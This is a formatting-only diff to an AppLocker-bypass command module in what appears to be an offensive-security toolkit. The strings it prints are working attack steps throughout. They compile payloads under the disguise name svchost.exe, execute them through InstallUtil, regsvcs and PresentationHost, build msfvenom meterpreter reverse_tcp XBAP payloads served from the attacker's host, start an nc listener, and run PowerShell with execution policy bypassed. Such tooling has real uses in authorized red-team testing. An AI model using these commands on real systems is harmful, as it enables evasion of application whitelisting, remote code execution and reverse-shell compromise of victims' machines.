@@ -131,11 +131,15 @@ class AppLockerBypassCommandSet(LazyOwnCommandSet):
 
         print_msg("Compile with: mcs sessions/installutil_bypass.cs -out:sessions/installutil_bypass.exe")
         print_msg("Or on target using csc.exe:")
-        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}")
+        print_msg(
+            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}"
+        )
         print_msg("")
         print_succ("Execute on target:")
-        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {exe_path}")
-        print_msg(f"  Or with alternate path: /U C:\\Users\\Public\\svchost.exe")
+        print_msg(
+            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {exe_path}"
+        )
+        print_msg("  Or with alternate path: /U C:\\Users\\Public\\svchost.exe")
         print_msg(f"Payload saved to {cs_path}")
 
     @cmd2.with_category(APP_LOCKER_CATEGORY)
@@ -188,9 +192,13 @@ class AppLockerBypassCommandSet(LazyOwnCommandSet):
         with open(cs_path, "w") as f:
             f.write(REGSVCS_CS.format(lhost=lhost, lport=lport))
 
-        print_msg("Compile with: mcs -r:System.EnterpriseServices.dll sessions/regsvcs_bypass.cs -out:sessions/regsvcs_bypass.dll")
+        print_msg(
+            "Compile with: mcs -r:System.EnterpriseServices.dll sessions/regsvcs_bypass.cs -out:sessions/regsvcs_bypass.dll"
+        )
         print_msg("Or on target:")
-        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:{dll_path} /target:library {cs_path}")
+        print_msg(
+            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:{dll_path} /target:library {cs_path}"
+        )
         print_msg("")
         print_succ("Execute on target:")
         print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe /U {dll_path}")
@@ -222,8 +230,10 @@ class AppLockerBypassCommandSet(LazyOwnCommandSet):
 
         print_succ(f"Payload saved to {cs_path}")
         print_succ("Execute on target:")
-        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}")
-        print_msg(f"  Then run: C:\\Users\\Public\\svchost.exe")
+        print_msg(
+            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}"
+        )
+        print_msg("  Then run: C:\\Users\\Public\\svchost.exe")
         print_msg(f"Start listener: nc -lvnp {lport}")
 
     @cmd2.with_category(APP_LOCKER_CATEGORY)
@@ -304,12 +314,16 @@ class AppLockerBypassCommandSet(LazyOwnCommandSet):
         os.makedirs("sessions", exist_ok=True)
 
         print_msg("PresentationHost.exe bypass via .xbap files:")
-        print_msg(f"  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f xbap > sessions/payload.xbap")
+        print_msg(
+            f"  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f xbap > sessions/payload.xbap"
+        )
         print_msg(f"  python3 -m http.server {lport}")
         print_msg(f"  C:\\Windows\\System32\\PresentationHost.exe http://{lhost}:{lport}/payload.xbap")
         print_msg("")
         print_msg("Alternative — direct command execution via XBAP:")
-        print_msg("  msfvenom -p windows/x64/exec CMD='powershell -ep bypass -c YourCommand' -f xbap > sessions/cmd.xbap")
+        print_msg(
+            "  msfvenom -p windows/x64/exec CMD='powershell -ep bypass -c YourCommand' -f xbap > sessions/cmd.xbap"
+        )
 
 
 __all__ = ["AppLockerBypassCommandSet"]
